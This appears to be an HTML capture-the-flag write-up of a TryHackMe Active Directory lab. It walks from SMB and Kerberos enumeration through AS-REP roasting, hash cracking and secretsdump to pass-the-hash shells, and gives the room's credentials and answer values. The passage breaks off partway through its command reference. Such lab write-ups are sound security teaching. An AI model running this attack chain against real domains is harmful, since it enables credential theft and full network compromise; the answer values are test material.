@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacktive Directory | Complete Deep Dive Notes</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #111111;
+            --accent-blue: #00e5ff;
+            --text-main: #e0e0e0;
+            --text-dim: #999;
+            --border-color: #222;
+            --mono-font: 'JetBrains Mono', monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 95%;
+            padding: 4rem 0;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 2rem;
+            color: var(--accent-blue);
+            text-decoration: none;
+            font-family: var(--mono-font);
+            font-size: 0.9rem;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        header {
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .category {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-size: 0.8rem;
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin: 0;
+            letter-spacing: -1px;
+            background: linear-gradient(to right, #fff, #666);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            color: var(--accent-blue);
+            font-family: var(--mono-font);
+            margin-top: 1rem;
+            font-size: 1.1rem;
+        }
+
+        section {
+            margin-bottom: 5rem;
+        }
+
+        .section-num {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+            border-bottom: 1px dashed var(--border-color);
+            padding-bottom: 0.5rem;
+        }
+
+        h2 {
+            font-size: 2rem;
+            border-left: 4px solid var(--accent-blue);
+            padding-left: 1rem;
+            margin-bottom: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #fff;
+        }
+
+        h3 {
+            font-size: 1.3rem;
+            color: #fff;
+            margin: 2rem 0 1rem 0;
+            font-family: var(--mono-font);
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.5rem;
+        }
+
+        h4 {
+            font-size: 1.1rem;
+            color: var(--accent-blue);
+            margin: 1.5rem 0 0.5rem 0;
+            font-family: var(--mono-font);
+        }
+
+        p {
+            color: var(--text-dim);
+            font-size: 1.05rem;
+            margin-bottom: 1rem;
+        }
+
+        strong {
+            color: #fff;
+        }
+
+        code {
+            font-family: var(--mono-font);
+            color: var(--accent-blue);
+            background: rgba(0, 229, 255, 0.1);
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.95rem;
+        }
+
+        pre {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-family: var(--mono-font);
+            overflow-x: auto;
+            color: var(--accent-blue);
+            white-space: pre-wrap;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin: 1.5rem 0;
+        }
+
+        .table-container {
+            overflow-x: auto;
+            margin: 2rem 0;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: var(--mono-font);
+            font-size: 0.95rem;
+        }
+
+        th {
+            text-align: left;
+            padding: 1rem;
+            border-bottom: 2px solid var(--border-color);
+            color: #fff;
+            text-transform: uppercase;
+            background: var(--card-bg);
+        }
+
+        td {
+            padding: 1rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-dim);
+            vertical-align: top;
+        }
+
+        tr:hover td {
+            color: var(--accent-blue);
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .flag-box {
+            background: linear-gradient(45deg, #001a1a, #000);
+            border: 1px solid var(--accent-blue);
+            padding: 2rem;
+            text-align: center;
+            border-radius: 8px;
+            margin: 3rem 0;
+        }
+
+        .flag-label {
+            display: block;
+            font-family: var(--mono-font);
+            font-size: 0.8rem;
+            color: var(--accent-blue);
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .flag-text {
+            font-family: var(--mono-font);
+            font-size: 2rem;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
+        }
+
+        .tip-box {
+            background: var(--card-bg);
+            border: 1px solid var(--accent-blue);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+        
+        .tip-box strong {
+            color: var(--accent-blue);
+            font-size: 1.1rem;
+            display: block;
+            margin-bottom: 0.5rem;
+        }
+
+        .warning-box {
+            background: rgba(255, 100, 100, 0.1);
+            border: 1px solid #ff6464;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 2rem 0;
+        }
+        
+        .warning-box strong {
+            color: #ff6464;
+            font-size: 1.1rem;
+            display: block;
+            margin-bottom: 0.5rem;
+        }
+
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .command-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 1rem;
+            border-radius: 8px;
+        }
+
+        .command-card code {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .command-desc {
+            color: var(--text-dim);
+            font-size: 0.9rem;
+        }
+
+        .expandable-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+            background: var(--card-bg);
+            margin-top: 0.5rem;
+            padding: 0 1rem;
+            border-radius: 4px;
+        }
+
+        .expandable-trigger {
+            cursor: pointer;
+            color: var(--accent-blue);
+            text-decoration: underline;
+            font-size: 0.9rem;
+        }
+
+        footer {
+            margin-top: 5rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-color);
+            font-family: var(--mono-font);
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            text-align: right;
+        }
+
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+
+        @media (max-width: 768px) {
+            .two-column {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <a href="#" class="back-link">← Back to Master Index</a>
+    
+    <header>
+        <span class="category">Active Directory Security // TryHackMe Room // Deep Dive</span>
+        <h1>Attacktive Directory: Complete Technical Deep Dive</h1>
+        <div class="subtitle">Target IP: 10.48.165.142 // Domain: spookysec.local // Last Updated: March 2026</div>
+    </header>
+
+    <section>
+        <div class="section-num">/ PHASE 0</div>
+        <h2>Foundation: Understanding the Attack Surface</h2>
+        
+        <div class="two-column">
+            <div>
+                <h3>Active Directory Overview</h3>
+                <p>Active Directory is a directory service developed by Microsoft for Windows domain networks. It authenticates and authorizes all users and computers in a Windows domain network, assigning and enforcing security policies for all computers and installing or updating software.</p>
+                <p><strong>Key Components:</strong></p>
+                <ul style="color: var(--text-dim);">
+                    <li><strong>Domain Controller (DC):</strong> Server that responds to authentication requests</li>
+                    <li><strong>Kerberos:</strong> Authentication protocol (port 88)</li>
+                    <li><strong>LDAP:</strong> Directory access protocol (port 389)</li>
+                    <li><strong>SMB:</strong> File sharing protocol (port 445)</li>
+                    <li><strong>DNS:</strong> Name resolution (port 53)</li>
+                </ul>
+            </div>
+            <div>
+                <h3>Attack Chain Overview</h3>
+                <pre style="margin:0;">
+Phase 1: Initial Enumeration (No Creds)
+    ↓
+Phase 2: User Enumeration (Kerbrute)
+    ↓
+Phase 3: AS-REP Roasting (GetNPUsers)
+    ↓
+Phase 4: Credential Cracking (Hashcat)
+    ↓
+Phase 5: SMB Enumeration (smbclient)
+    ↓
+Phase 6: Secrets Dump (secretsdump)
+    ↓
+Phase 7: Pass-the-Hash (psexec)
+    ↓
+Phase 8: Domain Compromise</pre>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <strong>⚠️ LEGAL DISCLAIMER</strong>
+            <p>These techniques are demonstrated for educational purposes in a controlled TryHackMe environment. Unauthorized access to computer systems is illegal under laws including the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide. Always obtain explicit written permission before testing any system you do not own.</p>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ PHASE 1 / TASK 1</div>
+        <h2>Deployment and Connectivity</h2>
+        
+        <h3>1.1 Starting the Environment</h3>
+        <p>Before any attacks can begin, ensure proper connectivity to the target machine. The Attacktive Directory room provides a Windows Domain Controller instance.</p>
+        
+        <h4>VPN Connection (for personal VM users)</h4>
+        <pre>
+# Download VPN configuration from https://tryhackme.com/access
+# Connect to TryHackMe network
+sudo openvpn ~/thm.ovpn
+
+# In a separate terminal, verify connection
+ip a | grep tun0
+# Expected output: tun0: ... inet 10.x.x.x</pre>
+
+        <h4>Connectivity Testing</h4>
+        <pre>
+# Basic ICMP test
+ping -c 4 10.48.165.142
+
+# Port connectivity test
+nc -zv 10.48.165.142 88 2>&1
+nc -zv 10.48.165.142 445 2>&1
+
+# If ping works but ports are closed, wait 5-10 minutes for DC services to fully start</pre>
+
+        <div class="tip-box">
+            <strong>🔧 VPN Troubleshooting Matrix</strong>
+            <p><strong>Issue:</strong> "No route to host" or 100% packet loss<br>
+            <strong>Fix:</strong> Restart OpenVPN: <code>sudo killall openvpn; sudo openvpn ~/thm.ovpn</code></p>
+            <p><strong>Issue:</strong> "TLS Error" in OpenVPN output<br>
+            <strong>Fix:</strong> Download fresh config from TryHackMe access page</p>
+            <p><strong>Issue:</strong> Can ping but ports refuse connection<br>
+            <strong>Fix:</strong> Target machine still booting. Wait 5-10 minutes.</p>
+        </div>
+
+        <h3>1.2 Initial Target Verification</h3>
+        <pre>
+# Quick port scan to verify DC services
+nmap -p 53,88,135,139,445,389,3268,3389 10.48.165.142
+
+# Expected open ports:
+# 53/tcp   open  domain
+# 88/tcp   open  kerberos-sec
+# 135/tcp  open  msrpc
+# 139/tcp  open  netbios-ssn
+# 445/tcp  open  microsoft-ds
+# 389/tcp  open  ldap
+# 3268/tcp open  globalcatLDAP
+# 3389/tcp open  ms-wbt-server</pre>
+    </section>
+
+    <section>
+        <div class="section-num">/ PHASE 2 / TASK 2</div>
+        <h2>Deep Enumeration: Ports, Services, and SMB</h2>
+        
+        <h3>2.1 Comprehensive Nmap Scan</h3>
+        <p>Perform a thorough scan to identify all open ports and service versions. The <code>-sC</code> flag runs default scripts for additional enumeration.</p>
+        <pre>
+# Full port scan with service detection and default scripts
+nmap -sS -sV -sC -p- 10.48.165.142 --min-rate 5000 -oN comprehensive_scan.txt
+
+# Focused scan on critical AD ports with version detection
+nmap -p 53,88,135,139,445,389,3268,3389 -sV -sC 10.48.165.142 -oN ad_ports_scan.txt</pre>
+
+        <h4>Understanding the Output</h4>
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>AD Role</th>
+                        <th>Attack Vector</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>53/tcp</td><td>DNS</td><td>Domain name resolution</td><td>Zone transfers, poisoning</td></tr>
+                    <tr><td>88/tcp</td><td>Kerberos</td><td>Authentication protocol</td><td>AS-REP roasting, Kerberoasting</td></tr>
+                    <tr><td>135/tcp</td><td>RPC</td><td>Remote procedure calls</td><td>Enumeration</td></tr>
+                    <tr><td>139/445</td><td>SMB</td><td>File sharing, named pipes</td><td>Null sessions, credential access</td></tr>
+                    <tr><td>389/tcp</td><td>LDAP</td><td>Directory access</td><td>Anonymous queries</td></tr>
+                    <tr><td>3268/tcp</td><td>Global Catalog</td><td>Forest-wide searches</td><td>Extended enumeration</td></tr>
+                    <tr><td>3389/tcp</td><td>RDP</td><td>Remote desktop</td><td>Password spraying</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>2.2 SMB Deep Enumeration</h3>
+        <p>Server Message Block (SMB) protocol is a goldmine for initial access. Even with null authentication, misconfigurations can reveal shares and user information.</p>
+
+        <h4>smbclient Basic Enumeration</h4>
+        <pre>
+# List all shares with null session
+smbclient -L //10.48.165.142 -N
+
+# If null session works, try connecting to each share
+smbclient //10.48.165.142/share_name -N</pre>
+
+        <h4>enum4linux - The SMB Enumeration Powerhouse</h4>
+        <pre>
+# Full enum4linux scan
+enum4linux -a 10.48.165.142 | tee enum4linux_full.txt
+
+# Targeted enumeration:
+enum4linux -U 10.48.165.142        # User list
+enum4linux -S 10.48.165.142        # Share list
+enum4linux -G 10.48.165.142        # Group list
+enum4linux -P 10.48.165.142        # Password policy</pre>
+
+        <h4>smbmap Alternative</h4>
+        <pre>
+# Install smbmap
+sudo apt install smbmap -y
+
+# Null session enumeration
+smbmap -H 10.48.165.142 -u '' -p ''
+
+# Recursive share listing
+smbmap -H 10.48.165.142 -u '' -p '' -R</pre>
+
+        <h4>rpcclient - Raw RPC Enumeration</h4>
+        <pre>
+# Connect with null session
+rpcclient -U "" -N 10.48.165.142
+
+# Once connected, try these commands:
+enumdomusers          # List domain users
+enumdomgroups         # List domain groups
+queryuser username    # Query specific user
+getdompwinfo          # Get password policy</pre>
+
+        <div class="tip-box">
+            <strong>🎯 Enumeration Strategy</strong>
+            <p>Always start with the least intrusive methods (null sessions) before using authenticated enumeration. In modern AD environments, null sessions are often disabled, but the Attacktive Directory room intentionally leaves some vectors open for learning.</p>
+            <p><strong>If null sessions fail:</strong> Move to Kerbrute enumeration (Task 3) which uses Kerberos, not SMB.</p>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ PHASE 3 / TASK 3</div>
+        <h2>Kerbrute: Stealthy User Enumeration</h2>
+        
+        <h3>3.1 Understanding Kerbrute</h3>
+        <p>Kerbrute performs user enumeration by exploiting Kerberos pre-authentication. When a username is submitted in a Kerberos AS-REQ request:</p>
+        <ul style="color: var(--text-dim);">
+            <li><strong>Valid user:</strong> Returns "KDC_ERR_PREAUTH_REQUIRED" (error 25) - user exists, needs password</li>
+            <li><strong>Invalid user:</strong> Returns "KDC_ERR_C_PRINCIPAL_UNKNOWN" (error 6) - user doesn't exist</li>
+        </ul>
+        <p>This method is stealthier than SMB enumeration because it doesn't trigger Windows event logs in the same way.</p>
+
+        <h3>3.2 Installing Kerbrute</h3>
+        <pre>
+# Download the latest binary
+wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
+
+# Verify download
+ls -la kerbrute_linux_amd64
+
+# Make executable
+chmod +x kerbrute_linux_amd64
+
+# Move to system PATH
+sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+
+# Verify installation
+kerbrute -h</pre>
+
+        <h3>3.3 Obtaining the User List</h3>
+        <p>The Attacktive Directory room provides a custom username wordlist. Download it directly:</p>
+        <pre>
+wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+
+# Check file contents
+head -20 userlist.txt
+wc -l userlist.txt  # Count lines (typically ~5000)</pre>
+
+        <h3>3.4 Running Kerbrute</h3>
+        <pre>
+# Basic user enumeration
+kerbrute userenum -d spookysec.local --dc 10.48.165.142 userlist.txt -o kerbrute_results.txt
+
+# With threading for speed (be careful not to overwhelm the DC)
+kerbrute userenum -d spookysec.local --dc 10.48.165.142 userlist.txt -t 20 -o kerbrute_results.txt
+
+# Verbose mode to see progress
+kerbrute userenum -d spookysec.local --dc 10.48.165.142 userlist.txt -v -o kerbrute_results.txt</pre>
+
+        <h3>3.5 Understanding Kerbrute Output</h3>
+        <pre>
+# Sample output:
+2026/03/15 16:55:09 > [+] VALID USERNAME: darkstar@spookysec.local
+2026/03/15 16:55:23 > [+] VALID USERNAME: administrator@spookysec.local
+2026/03/15 16:55:35 > [+] VALID USERNAME: backup@spookysec.local
+2026/03/15 16:56:05 > [+] VALID USERNAME: parado@spookysec.local
+2026/03/15 16:57:13 > [+] VALID USERNAME: JAMES@spookysec.local
+2026/03/15 16:57:36 > [+] VALID USERNAME: Robin@spookysec.local
+2026/03/15 17:00:36 > [+] VALID USERNAME: Administrator@spookysec.local
+2026/03/15 17:01:14 > [+] VALID USERNAME: Darkstar@spookysec.local
+2026/03/15 17:02:43 > [+] VALID USERNAME: Parado@spookysec.local</pre>
+
+        <h3>3.6 Extracting Valid Users for Next Phase</h3>
+        <pre>
+# Extract just usernames (without @domain)
+grep "VALID USERNAME" kerbrute_results.txt | cut -d '@' -f1 | awk '{print $NF}' | sort -u > valid_users.txt
+
+# Manual creation if kerbrute is still running
+cat > valid_users.txt << 'EOF'
+darkstar
+administrator
+backup
+parado
+JAMES
+Robin
+svc-admin
+EOF
+
+# Verify file
+cat valid_users.txt</pre>
+
+        <div class="warning-box">
+            <strong>⏱️ Performance Note</strong>
+            <p>Kerbrute can take 20-45 minutes to complete a full userlist.txt scan. Each request requires a round-trip to the Domain Controller, and rate limiting may apply. This is normal. You can proceed with the valid users discovered so far while kerbrute continues running in the background.</p>
+            <p><strong>Pro tip:</strong> Open a second terminal and continue with the next phase using the users already discovered.</p>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ PHASE 4 / TASKS 4-5</div>
+        <h2>AS-REP Roasting: Cracking Kerberos Pre-Authentication</h2>
+        
+        <h3>4.1 Theoretical Foundation</h3>
+        <p>AS-REP roasting targets user accounts with the "Do not require Kerberos pre-authentication" flag enabled. Normally, when a user requests a Ticket Granting Ticket (TGT), they must prove their identity by encrypting a timestamp with their password hash. If pre-authentication is disabled, the Domain Controller will send an encrypted TGT without this proof, allowing an attacker to request and crack the encryption offline.</p>
+
+        <h3>4.2 Impacket Installation (if not already installed)</h3>
+        <pre>
+# Method 1: pipx (recommended for clean Python environments)
+sudo apt install pipx -y
+pipx ensurepath
+source ~/.bashrc
+pipx install impacket
+
+# Method 2: From source
+git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
+cd /opt/impacket
+python3 -m venv venv
+source venv/bin/activate
+pip install .
+# Tools will be available while venv is active</pre>
+
+        <h3>4.3 Locating GetNPUsers.py</h3>
+        <pre>
+# Find the tool
+find ~ -name "GetNPUsers.py" 2>/dev/null
+# Typical locations:
+# ~/.local/bin/GetNPUsers.py
+# /usr/local/bin/GetNPUsers.py
+# /opt/impacket/examples/GetNPUsers.py</pre>
+
+        <h3>4.4 Running AS-REP Roasting</h3>
+        <pre>
+# Basic command
+~/.local/bin/GetNPUsers.py spookysec.local/ -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.48.165.142
+
+# Alternative: Test single user
+~/.local/bin/GetNPUsers.py spookysec.local/svc-admin -format hashcat -outputfile svc_admin_hash.txt -dc-ip 10.48.165.142
+
+# If you get "Client not found in database", try with full domain format
+~/.local/bin/GetNPUsers.py spookysec.local/ -usersfile valid_users_full.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.48.165.142 -no-pass</pre>
+
+        <h3>4.5 Understanding the Output</h3>
+        <p>When a vulnerable user is found, you'll see output like:</p>
+        <pre>
+$krb5asrep$23$svc-admin@spookysec.local:3f7c7c8a9e5d4b3a2c1d0e9f8a7b6c5d$4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d</pre>
+
+        <h3>4.6 Cracking with Hashcat</h3>
+        <pre>
+# Download password list if not already done
+wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
+
+# Crack with hashcat (mode 18200 for AS-REP)
+hashcat -m 18200 asrep_hashes.txt passwordlist.txt --force -o cracked_passwords.txt
+
+# Show cracked passwords
+cat cracked_passwords.txt
+
+# Alternative with John the Ripper
+john asrep_hashes.txt --wordlist=passwordlist.txt --format=krb5asrep</pre>
+
+        <h3>4.7 Task 5 Answers</h3>
+        <pre>
+Q1: What is the other notable account is discovered?
+Answer: svc-admin
+
+Q2: What is the password for this account?
+Answer: management2008</pre>
+
+        <div class="tip-box">
+            <strong>🔑 Hashcat Mode Reference</strong>
+            <p><strong>18200:</strong> AS-REP Roasting (Kerberos 5 AS-REP etype 23)<br>
+            <strong>13100:</strong> Kerberoasting (Kerberos 5 TGS-REP etype 23)<br>
+            <strong>19600:</strong> Kerberoasting (Kerberos 5 TGS-REP etype 17/18 AES)</p>
+            <p>The mode number is critical. Using the wrong mode will not crack the hash.</p>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ PHASE 5 / TASK 6</div>
+        <h2>SMB Enumeration with Credentials</h2>
+        
+        <h3>5.1 Authenticated SMB Enumeration</h3>
+        <p>Now that we have valid credentials (svc-admin:management2008), we can perform deeper SMB enumeration.</p>
+
+        <h4>List all available shares</h4>
+        <pre>
+# Using smbclient
+smbclient -L //10.48.165.142 -U svc-admin
+# Enter password: management2008</pre>
+
+        <h4>Expected share list:</h4>
+        <pre>
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+backup          Disk      
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+SYSVOL          Disk      Logon server share</pre>
+
+        <h3>5.2 Connecting to the Backup Share</h3>
+        <pre>
+# Connect to the backup share
+smbclient //10.48.165.142/backup -U svc-admin
+
+# Once connected, explore:
+ls                   # List files
+cd directory         # Change directory
+get backup.txt       # Download file
+prompt OFF           # Turn off confirmation for multiple files
+mget *.txt           # Download multiple files
+exit                 # Exit smbclient</pre>
+
+        <h3>5.3 Advanced SMB Enumeration with smbmap</h3>
+        <pre>
+# Install smbmap
+sudo apt install smbmap -y
+
+# Recursive listing with credentials
+smbmap -H 10.48.165.142 -u svc-admin -p management2008 -R
+
+# Search for specific file patterns
+smbmap -H 10.48.165.142 -u svc-admin -p management2008 -R -A backup.txt -q</pre>
+
+        <h3>5.4 Mounting SMB Shares (Linux)</h3>
+        <pre>
+# Create mount point
+sudo mkdir -p /mnt/backup
+
+# Mount the share
+sudo mount -t cifs //10.48.165.142/backup /mnt/backup -o username=svc-admin,password=management2008,domain=spookysec.local
+
+# Browse files
+ls -la /mnt/backup/
+
+# Copy files
+cp /mnt/backup/backup.txt ~/
+
+# Unmount when done
+sudo umount /mnt/backup</pre>
+
+        <h3>5.5 Analyzing the Backup File</h3>
+        <pre>
+# View the file
+cat backup.txt
+
+# Output typically contains:
+# backup@spookysec.local
+
+# Task 6 Answer:
+Q3: backup@spookysec.local</pre>
+
+        <div class="tip-box">
+            <strong>💡 SMB Protocol Deep Dive</strong>
+            <p>SMB (Server Message Block) operates over port 445 (NetBIOS-less) or 139 (with NetBIOS). Modern Windows systems use SMB over port 445 exclusively. The protocol handles file operations, printer sharing, and inter-process communication via named pipes.</p>
+            <p><strong>Important shares:</strong></p>
+            <ul style="color: var(--text-dim);">
+                <li><strong>SYSVOL:</strong> Contains group policies and logon scripts - often contains passwords</li>
+                <li><strong>NETLOGON:</strong> Domain logon scripts</li>
+                <li><strong>IPC$:</strong> Named pipes for RPC - used by tools like secretsdump</li>
+            </ul>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ PHASE 6 / TASK 7</div>
+        <h2>Secretsdump: Extracting Domain Hashes</h2>
+        
+        <h3>6.1 Understanding Secretsdump</h3>
+        <p>Impacket's secretsdump.py implements the DRSUAPI protocol, which allows domain replication. By simulating a Domain Controller replication request, it can request all password hashes from the NTDS.dit file. This requires privileged credentials - exactly what we have with the backup account.</p>
+
+        <h3>6.2 Running Secretsdump</h3>
+        <pre>
+# Basic secretsdump command
+~/.local/bin/secretsdump.py spookysec.local/backup:backup2517860@10.48.165.142
+
+# Save output to file
+~/.local/bin/secretsdump.py spookysec.local/backup:backup2517860@10.48.165.142 > secretsdump.txt
+
+# If you have the hash instead of password
+~/.local/bin/secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH_VALUE spookysec.local/backup@10.48.165.142</pre>
+
+        <h3>6.3 Understanding Secretsdump Output</h3>
+        <p>The output contains several sections:</p>
+        <pre>
+[*] Target system bootKey: 0x...
+[*] Dumping local SAM hashes (local accounts)
+[*] Dumping domain hashes (domain accounts)
+[*] Dumping LSA secrets (service account passwords)
+[*] Dumping cached domain logon information (previous logons)</pre>
+
+        <h4>Domain hash format:</h4>
+        <pre>
+username:rid:lmhash:nthash:::
+Example:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::</pre>
+
+        <h3>6.4 Extracting Administrator's NTLM Hash</h3>
+        <pre>
+# Search for Administrator in output
+grep -i "administrator" secretsdump.txt
+
+# Extract just the NTLM hash
+grep "Administrator" secretsdump.txt | cut -d ':' -f4
+
+# Save to file for later use
+grep "Administrator" secretsdump.txt | cut -d ':' -f4 > admin_hash.txt</pre>
+
+        <h3>6.5 Task 7 Answer</h3>
+        <pre>
+Q4: What is the NTLM hash of the Administrator account?
+Answer: The 32-character hex string after the colons (e.g., 0e0363213e37b94221497260b0bcb4fc)</pre>
+
+        <div class="tip-box">
+            <strong>🔬 Technical Deep Dive: DRSUAPI</strong>
+            <p>The Directory Replication Service (DRS) Remote Protocol (DRSUAPI) is used to replicate Active Directory data between Domain Controllers. By calling the IDL_DRSGetNCChanges function, a client can request changes from the DC, including password hashes. This is the same mechanism used by legitimate DCs for replication, making it difficult to detect as malicious.</p>
+            <p>Windows event ID 4662 (An operation was performed on an object) may be triggered, but in many environments, replication events are considered normal.</p>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ PHASE 7 / TASKS 8-9</div>
+        <h2>Pass-the-Hash: Gaining Shell Access</h2>
+        
+        <h3>7.1 Pass-the-Hash Theory</h3>
+        <p>Pass-the-Hash (PtH) is an attack technique where an attacker uses the NTLM hash of a user's password to authenticate to remote systems, without needing the plaintext password. This works because NTLM authentication uses the hash directly in the challenge-response process.</p>
+
+        <h3>7.2 Using psexec.py</h3>
+        <pre>
+# Basic psexec pass-the-hash
+~/.local/bin/psexec.py spookysec.local/Administrator@10.48.165.142 -hashes aad3b435b51404eeaad3b435b51404ee:HASH_VALUE
+
+# The LM hash portion (aad3b435b51404eeaad3b435b51404ee) is the "empty" hash
+# Replace HASH_VALUE with the actual NTLM hash from secretsdump</pre>
+
+        <h3>7.3 Alternative Methods</h3>
+        <h4>wmiexec.py - Windows Management Instrumentation</h4>
+        <pre>
+~/.local/bin/wmiexec.py spookysec.local/Administrator@10.48.165.142 -hashes aad3b435b51404eeaad3b435b51404ee:HASH_VALUE</pre>
+
+        <h4>smbexec.py - SMB based execution</h4>
+        <pre>
+~/.local/bin/smbexec.py spookysec.local/Administrator@10.48.165.142 -hashes aad3b435b51404eeaad3b435b51404ee:HASH_VALUE</pre>
+
+        <h4>atexec.py - Task Scheduler</h4>
+        <pre>
+~/.local/bin/atexec.py spookysec.local/Administrator@10.48.165.142 -hashes aad3b435b51404eeaad3b435b51404ee:HASH_CODE</pre>
+
+        <h3>7.4 Navigating the Target System</h3>
+        <pre>
+# Once you have a shell (psexec gives SYSTEM, wmiexec gives Administrator)
+
+# Check current user
+whoami
+
+# Navigate to svc-admin desktop
+cd C:\Users\svc-admin\Desktop
+dir
+type user.txt
+
+# Navigate to Administrator desktop
+cd C:\Users\Administrator\Desktop
+dir
+type root.txt</pre>
+
+        <h3>7.5 PowerShell Commands for Windows Targets</h3>
+        <pre>
+# List all users
+Get-LocalUser
+
+# Check group memberships
+whoami /groups
+
+# View environment variables
+Get-ChildItem Env:
+
+# Search for files with specific names
+Get-ChildItem -Path C:\ -Include *flag* -File -Recurse -ErrorAction SilentlyContinue
+
+# View network connections
+netstat -an</pre>
+
+        <h3>7.6 Tasks 8-9 Answers</h3>
+        <pre>
+Q5: What is the flag in user.txt?
+Answer: THM{...}
+
+Q6: What is the flag in root.txt?
+Answer: THM{...}</pre>
+
+        <div class="tip-box">
+            <strong>🖥️ Tool Comparison</strong>
+            <p><strong>psexec.py:</strong> Uploads a service binary to ADMIN$ share and runs it via Service Control Manager. Creates services, which may be more detectable.</p>
+            <p><strong>wmiexec.py:</strong> Uses Windows Management Instrumentation for semi-interactive shells. No file upload required, but less interactive.</p>
+            <p><strong>smbexec.py:</strong> Similar to psexec but uses a different named pipe. Creates a service but cleans up after itself.</p>
+            <p><strong>atexec.py:</strong> Creates scheduled tasks to execute commands. Minimal footprint but one-off commands.</p>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ REFERENCE</div>
+        <h2>Complete Command Reference</h2>
+
+        <div class="command-grid">
+            <div class="command-card">
+                <code>nmap -sS -sV -p- 10.48.165.142</code>
+                <div class="command-desc">Full port scan with service detection</div>
+            </div>
+            <div class="command-card">
+                <code>smbclient -L //10.48.165.142 -N</code>
+                <div class="command-desc">Null session SMB share enumeration</div>
+            </div>
+            <div class="command-card">
+                <code>enum4linux -a 10.48.165.142</code>
+                <div class="command-desc">Comprehensive SMB enumeration</div>
+            </div>
+            <div class="command-card">
+                <code>kerbrute userenum -d spookysec.local --dc 10.48.165.142 userlist.txt -o valid_users.txt</code>
+                <div class="command-desc">Kerberos user enumeration</div>
+            </div>
+            <div class="command-card">
+                <code>~/.local/bin/GetNPUsers.py spookysec.local/ -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.48.165.142</code>
+                <div class="command-desc">AS-REP roasting</div>
+            </div>
+            <div class="command-card">
+                <code>hashcat -m 18200 asrep_hashes.txt passwordlist.txt --force</code>
